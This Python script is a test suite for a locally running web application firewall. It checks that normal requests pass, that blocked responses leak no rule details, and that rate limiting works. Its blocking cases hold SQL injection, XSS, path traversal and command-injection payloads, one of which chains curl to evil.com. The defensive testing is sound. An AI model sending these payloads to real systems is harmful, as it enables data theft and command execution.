import urllib.request
import urllib.parse
import urllib.error
import json
import time

BASE_URL = "http://127.0.0.1:8080"

test_cases = [
    # =========================================================================
    # 1. 正常請求 (預期 200 OK 放行)
    # =========================================================================
    {
        "name": "正常首頁 GET 請求",
        "method": "GET",
        "path": "/",
        "expected_status": 200
    },
    {
        "name": "正常商品查詢 (多參數)",
        "method": "GET",
        "path": "/products?category=books&page=2",
        "expected_status": 200
    },
    {
        "name": "正常使用者登入 POST 表單",
        "method": "POST",
        "path": "/api/login",
        "body": "username=alice&password=mypassword123",
        "expected_status": 200
    },
    {
        "name": "正常 PUT 更新請求",
        "method": "PUT",
        "path": "/api/user/profile",
        "body": '{"nickname":"Bob","bio":"Hello world"}',
        "headers": {"Content-Type": "application/json"},
        "expected_status": 200
    },
    {
        "name": "正常 DELETE 刪除請求",
        "method": "DELETE",
        "path": "/api/items/123",
        "expected_status": 200
    },

    # =========================================================================
    # 2. 誤判防範測試 (False Positive Test) - 舊版規則會誤殺，新版必須放行
    # =========================================================================
    {
        "name": "正常包含 '#' 符號的查詢 (如 C# 關鍵字)",
        "method": "GET",
        "path": "/search?q=C%23%20programming",
        "expected_status": 200
    },
    {
        "name": "正常包含色碼的 POST JSON (如 #ffffff)",
        "method": "POST",
        "path": "/theme/color",
        "body": '{"color": "#ffffff", "border": "#333"}',
        "headers": {"Content-Type": "application/json"},
        "expected_status": 200
    },
    {
        "name": "正常包含連續連字號 '--' 的標籤 (如 step--1)",
        "method": "GET",
        "path": "/tags?name=step--1",
        "expected_status": 200
    },

    # =========================================================================
    # 3. 攻擊攔截：SQL 注入 (SQLi)
    # =========================================================================
    {
        "name": "SQLi 萬能密碼注入 (' OR '1'='1)",
        "method": "GET",
        "path": "/login?user=admin%27%20OR%20%271%27=%271",
        "expected_status": 403
    },
    {
        "name": "SQLi 聯合查詢 (UNION SELECT)",
        "method": "GET",
        "path": "/users?id=1%20UNION%20SELECT%20username,password%20FROM%20admin",
        "expected_status": 403
    },
    {
        "name": "SQLi 堆疊指令 (DROP TABLE)",
        "method": "POST",
        "path": "/api/feedback",
        "body": "content=hello; DROP TABLE users; -- ",
        "expected_status": 403
    },
    {
        "name": "SQLi 時間盲注與函數 (SLEEP)",
        "method": "GET",
        "path": "/products?id=1%20AND%20sleep(5)",
        "expected_status": 403
    },

    # =========================================================================
    # 4. 攻擊攔截：跨站腳本攻擊 (XSS)
    # =========================================================================
    {
        "name": "XSS 標籤注入 (<script>alert(1)</script>)",
        "method": "GET",
        "path": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
        "expected_status": 403
    },
    {
        "name": "XSS 標籤注入 (<svg onload=alert(1)>)",
        "method": "GET",
        "path": "/avatar?img=%3Csvg%20onload=alert(1)%3E",
        "expected_status": 403
    },
    {
        "name": "XSS 事件處理屬性 (onerror=alert)",
        "method": "GET",
        "path": "/avatar?img=x%22%20onerror=%22alert(1)",
        "expected_status": 403
    },
    {
        "name": "XSS 偽協議 (javascript:alert(1))",
        "method": "GET",
        "path": "/link?url=javascript:alert(1)",
        "expected_status": 403
    },

    # =========================================================================
    # 5. 攻擊攔截：路徑穿越 (Path Traversal) 與雙重編碼繞過
    # =========================================================================
    {
        "name": "Path Traversal 目錄遍歷 (../../etc/passwd)",
        "method": "GET",
        "path": "/download?file=../../etc/passwd",
        "expected_status": 403
    },
    {
        "name": "Path Traversal 雙重 URL 編碼逃逸繞過 (%252e%252e%252f)",
        "method": "GET",
        "path": "/download?file=%252e%252e%252f%252e%252e%252fetc/passwd",
        "expected_status": 403
    },
    {
        "name": "Path Traversal Windows 系統檔案存取 (windows/system32)",
        "method": "GET",
        "path": "/view?path=C:/windows/system32/cmd.exe",
        "expected_status": 403
    },

    # =========================================================================
    # 6. 攻擊攔截：系統指令注入 (Command Injection)
    # =========================================================================
    {
        "name": "Command Injection 分號串接 (; whoami)",
        "method": "GET",
        "path": "/ping?host=127.0.0.1;%20whoami",
        "expected_status": 403
    },
    {
        "name": "Command Injection 管道與邏輯運算子 (&& curl)",
        "method": "GET",
        "path": "/ping?host=127.0.0.1%20%26%26%20curl%20http://evil.com",
        "expected_status": 403
    },

    # =========================================================================
    # 7. 管理功能：線上熱重載端點
    # =========================================================================
    {
        "name": "WAF 規則庫熱重載 (POST /waf/admin/reload)",
        "method": "POST",
        "path": "/waf/admin/reload",
        "body": "{}",
        "expected_status": 200
    }
]

def run_tests():
    print("=" * 70)
    print("         進階 WAF 自動化全功能驗證套件 (Enhanced Verification Suite)")
    print("=" * 70)
    
    passed_count = 0
    total_count = len(test_cases)
    info_leak_detected = False

    for i, tc in enumerate(test_cases, 1):
        url = BASE_URL + tc["path"]
        data = tc.get("body", None)
        if data:
            data = data.encode("utf-8")

        headers = tc.get("headers", {})
        if "User-Agent" not in headers:
            headers["User-Agent"] = "WAF-Test-Runner/2.0"
        if data and "Content-Type" not in headers:
            headers["Content-Type"] = "application/x-www-form-urlencoded"

        req = urllib.request.Request(url, data=data, headers=headers, method=tc["method"])

        status_code = 0
        body = ""

        try:
            with urllib.request.urlopen(req, timeout=3) as resp:
                status_code = resp.getcode()
                body = resp.read().decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            status_code = e.code
            body = e.read().decode("utf-8", errors="ignore")
        except Exception as e:
            print(f"[{i:02d}/{total_count:02d}] [ERROR] 無法連接 WAF 伺服器: {e}")
            continue

        is_status_ok = (status_code == tc["expected_status"])

        # 檢驗 403 阻擋回應是否符合「零敏感資訊洩漏」規範
        if status_code == 403:
            try:
                parsed = json.loads(body)
                if "request_id" not in parsed:
                    print(f"       [WARN] 403 回應未提供 request_id！")
                if "matched_rule" in parsed or "matched_payload" in parsed:
                    info_leak_detected = True
                    print(f"       [SECURITY LEAK] 403 回應洩漏了內部規則細節！")
            except Exception:
                pass

        if is_status_ok:
            print(f"[{i:02d}/{total_count:02d}] [PASS] 通過 | 狀態碼: {status_code} | {tc['name']}")
            passed_count += 1
        else:
            print(f"[{i:02d}/{total_count:02d}] [FAIL] 未通過 | 期望 {tc['expected_status']} 但得到 {status_code} | {tc['name']}")
            print(f"       回應內容: {body.strip()[:120]}")

    print("=" * 70)
    print(f"基礎測試統計: 共 {total_count} 項，通過 {passed_count} 項，失敗 {total_count - passed_count} 項。")
    print(f"資訊外洩檢驗: {'安全合格 (未外洩規則細節)' if not info_leak_detected else '不合格 (存在特徵外洩)'}")
    print("=" * 70)

    # 執行頻率限制 (Rate Limiting) 壓測檢驗 (限制為 30 請求 / 10 秒)
    print("\n[RATE LIMIT TEST] 正在測試高頻連線限制 (Rate Limiting 429 檢驗)...")
    flood_blocked = False
    for req_idx in range(40):
        try:
            r = urllib.request.Request(f"{BASE_URL}/?flood={req_idx}")
            with urllib.request.urlopen(r, timeout=2) as resp:
                pass
        except urllib.error.HTTPError as e:
            if e.code == 429:
                flood_blocked = True
                print(f"[PASS] 成功於第 {req_idx + 1} 次連線觸發頻率限制 (HTTP 429 Too Many Requests)")
                break
        except Exception:
            pass

    if flood_blocked:
        print("[SUCCESS] Rate Limiting 模組防禦生效！")
    else:
        print("[NOTICE] 未觸發 Rate Limit。")

if __name__ == "__main__":
    run_tests()
